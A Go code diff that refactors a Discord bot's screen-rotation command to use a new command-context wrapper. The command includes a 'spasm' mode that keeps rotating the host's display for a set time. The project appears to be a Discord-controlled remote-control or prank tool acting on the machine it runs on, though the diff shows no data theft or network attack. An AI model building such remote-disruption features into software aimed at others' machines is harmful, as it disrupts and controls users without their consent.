@@ -6,22 +6,21 @@ import (
 	"time"
 
 	"requiem/funcs"
+	"requiem/store"
 	"requiem/utils"
-
-	"github.com/bwmarrin/discordgo"
 )
 
-func (*RotateCommand) Exec(ses *discordgo.Session, msg *discordgo.MessageCreate, args []string) {
+func (*RotateCommand) Exec(ctx *store.CommandContext, args []string) {
 	content := strings.Join(args, " ")
 
 	if utils.HasFlag(content, "spasm") {
 		timeout, found := utils.FindNumber(content)
 		if !found {
-			ses.ChannelMessageSendReply(msg.ChannelID, "🟥 You need to provde a number.", msg.Reference())
+			ctx.ReplyMsg("🟥 You need to provde a number.")
 			return
 		}
 
-		initial, _ := ses.ChannelMessageSendReply(msg.ChannelID, "Rotating screen...", msg.Reference())
+		initial, _ := ctx.ReplyMsg("Rotating screen...")
 
 		until := time.Now().Add(time.Duration(timeout) * time.Second)
 		for i := 0; time.Now().Before(until); i = (i + 1) % 4 {
@@ -31,8 +30,8 @@ func (*RotateCommand) Exec(ses *discordgo.Session, msg *discordgo.MessageCreate,
 
 		funcs.RotateScreen(0)
 
-		ses.ChannelMessageDelete(msg.ChannelID, initial.ID)
-		ses.ChannelMessageSendReply(msg.ChannelID, "🟩 Successfully rotated screen.", msg.Reference())
+		ctx.DeleteMsg(initial.ID)
+		ctx.ReplyMsg("🟩 Successfully rotated screen.")
 		return
 	}
 
@@ -47,14 +46,14 @@ func (*RotateCommand) Exec(ses *discordgo.Session, msg *discordgo.MessageCreate,
 	} else if utils.HasFlag(content, "270") {
 		err = funcs.RotateScreen(3)
 	} else {
-		ses.ChannelMessageSendReply(msg.ChannelID, "🟥 Invalid flag.", msg.Reference())
+		ctx.ReplyMsg("🟥 Invalid flag.")
 		return
 	}
 
 	if err == nil {
-		ses.ChannelMessageSendReply(msg.ChannelID, "🟩 Successfully rotated screen.", msg.Reference())
+		ctx.ReplyMsg("🟩 Successfully rotated screen.")
 	} else {
-		ses.ChannelMessageSendReply(msg.ChannelID, fmt.Sprintf("🟥 Failed to rotate screen - %s", err), msg.Reference())
+		ctx.ReplyMsg(fmt.Sprintf("🟥 Failed to rotate screen - %s", err))
 	}
 }
 
